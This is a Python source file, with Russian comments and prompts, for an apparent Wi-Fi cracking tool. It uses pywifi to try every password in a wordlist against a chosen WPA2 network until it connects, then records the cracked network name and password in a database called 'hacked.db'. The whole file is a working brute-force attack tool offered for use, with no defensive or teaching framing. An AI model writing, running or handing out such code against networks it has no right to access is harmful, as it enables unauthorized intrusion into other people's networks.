import sqlite3, os
from pywifi import Profile, const
from libs.termFormat import TColors
from libs.func import clear, checkfiles
from time import sleep
from tqdm import trange

def victim (iface, ssid, password): # Сетевой профиль
    profile = Profile()
    profile.ssid = ssid
    profile.auth = const.AUTH_ALG_OPEN
    profile.akm.append(const.AKM_TYPE_WPA2PSK)
    profile.cipher = const.CIPHER_TYPE_CCMP
    profile.key = password
    iface.remove_all_network_profiles()

    profile = iface.add_network_profile(profile)
    iface.connect(profile)
    sleep(0.1)
    while iface.status() == 3: sleep(0.1)

    if iface.status() == const.IFACE_CONNECTED:
        return True
    else: return False

def brutforce(iface, ssid):
    if checkfiles() == 0: return 0
    connection = sqlite3.connect('files\\hacked.db')
    cursor = connection.cursor()

    # Проверка наличия выбранной сети в базе данных
    cursor.execute('CREATE TABLE IF NOT EXISTS Networks (id INTEGER PRIMARY KEY,\
                   ssid TEXT NOT NULL, password TEXT NOT NULL)')
    cursor.execute('SELECT ssid FROM Networks WHERE ssid = ?', (ssid,))
    usr_sel = None
    if cursor.fetchone() != None:
        while True:
            usr_sel = input(TColors.USER + '[*] Выбранная сеть уже взломана.\
                    \n[Y] Для повторного подбора, [N] Для выхода: '\
                    + TColors.END)
            if usr_sel.upper() == ('Y' or '[Y]'):
                break
            elif usr_sel.upper() == ('N' or '[N]'):
                print(TColors.SUCCESS + '\n[+] Проверьте базу данных files\hacked.db' + TColors.END)
                connection.close()
                return 0
            else:
                print(TColors.ERROR + '[-] Введено неверное значение. Попробуйте еще раз'\
                      + TColors.END)
                continue
    # ----------------------------------------------
    
    clear()
    if os.stat("files\\words.txt").st_size != 0:
        passwords = open('files\\words.txt', 'r')
    else:
        print(TColors.ERROR + "[-] Словарь паролей (files\words.txt) пуст" + TColors.END)
        sleep(5)
        return 0
        
    l = len(passwords.readlines())
    passwords.seek(0)
    count = 0
    print(TColors.PROC)
    with trange(l, dynamic_ncols=True, desc=(f"[~] Попытка взлома {ssid}..."),\
                bar_format=(TColors.PROC + '{l_bar}{bar}{r_bar}'), unit='pwd') as bar:
        for pwd in passwords:
            if victim(iface, ssid, pwd.rstrip()) == True:
                bar.update(l - count)
                bar.close()
                sleep(0.2)
                clear()
                if usr_sel == None:
                        cursor.execute('SELECT COUNT(*) FROM Networks')
                        id = cursor.fetchall()[0]
                        for i in id:
                            id = i
                        cursor.execute('INSERT INTO Networks (id, ssid, password) VALUES\
                                       (?, ?, ?)', (id + 1, ssid, pwd.rstrip()))
                        connection.commit()
                else:
                    cursor.execute('UPDATE Networks SET password = ? WHERE ssid = ?',\
                                   (pwd.rstrip(), ssid))
                    connection.commit()
                print(TColors.SUCCESS +\
                      f"[+] Успешное подключение!\nПароль: {pwd.rstrip()}\
                      \n\n[+] Данные записаны в files\hacked.db" + TColors.END)
                connection.close()
                return 1
            else:
                bar.update(1)
                count += 1

    clear()
    connection.close()
    print(TColors.ERROR + "[-] Не удалось подобрать пароль :(" + TColors.END)